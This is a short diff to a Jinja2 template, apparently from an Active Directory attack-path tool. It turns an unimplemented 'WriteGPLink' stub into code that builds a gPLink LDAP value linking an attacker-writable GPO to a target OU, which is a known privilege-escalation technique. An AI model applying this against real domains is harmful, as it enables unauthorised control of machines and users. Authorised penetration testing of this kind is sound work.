@@ -1,3 +1,10 @@
-# Unimplemented WriteGPLink({{target.name}})
-# https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory
-# https://markgamache.blogspot.com/2020/07/exploiting-ad-gplink-for-good-or-evil.html
+{% set ou = require['original_target'] %}
+{% set domain_dn = 'DC=' + fqdn|replace('.', ',DC=') %}
+# Link writable GPO {{target.name}} to OU {{ou.name}}
+# gPLink is multi-value and order-sensitive; verify effective precedence before adding a new link
+{% set key = 'gPLink' %}
+{% set target_name = ou.name %}
+{% set add_value = '[LDAP://CN=' + target.gpo_dirname_id + ',CN=Policies,CN=System,' + domain_dn + ';0]' %}
+{% set write_value = None %}
+{% set save_in_var = '' %}
+{% include '_Attr.jinja2' with context %}
